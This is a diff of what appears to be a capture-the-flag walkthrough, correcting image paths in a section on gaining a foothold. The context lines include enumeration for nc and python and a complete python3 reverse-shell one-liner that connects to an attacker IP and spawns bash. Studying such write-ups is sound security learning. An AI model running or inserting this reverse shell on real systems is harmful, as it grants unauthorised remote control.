@@ -111,7 +111,7 @@ While the parameters mean:
 
 We navigate to /images/uploads/ but get a forbidden error.
 
-![cmd](/images/magis/cmd.png) 
+![cmd](/images/magic/cmd.png) 
 
 After navigating to the file, we can run a few enumeration commands to find out which tools are available on the host (eg. which nc, which python(3), locate python, etc ..)
 We discover we have python3 so we chose that to create the reverse shell back to our host
@@ -123,7 +123,7 @@ Run a netcat listener and a python reverse shell oneliner (http://pentestmonkey.
 >/usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.45",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
 
 
-![python_rev_shell](/images/magis/rev_shell.png) 
+![python_rev_shell](/images/magic/rev_shell.png) 
 
 Get a proper shell by runnig
 >ctrl+z, stty raw -echo, fg, enter, enter)
